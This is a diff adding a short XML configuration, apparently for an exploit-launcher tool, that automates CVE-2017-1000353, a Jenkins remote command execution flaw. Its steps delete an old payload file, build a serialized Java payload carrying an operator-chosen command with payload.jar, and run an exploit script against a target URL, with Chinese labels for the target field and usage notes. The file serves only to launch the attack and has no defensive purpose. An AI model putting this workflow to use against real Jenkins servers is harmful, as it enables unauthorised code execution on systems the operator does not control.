@@ -1,0 +1,18 @@
+<sfjt>inject</sfjt>
+<cs1mc>目标网址</cs1mc>
+<cs2mc>Command</cs2mc>
+<zbz>3</zbz>
+<bz1>
+<cmd>DEL /F /A /Q combie.ser</cmd>
+</bz1>
+<bz2>
+<cmd>java -jar payload.jar combie.ser "<cs2/>"</cmd>
+</bz2>
+<bz3>
+<cmd>python CVE-2017-1000353.py <cs1/></cmd>
+</bz3>
+<bz>CVE-2017-1000353
+
+Jenkins远程命令执行
+
+目标网址加 http://</bz>
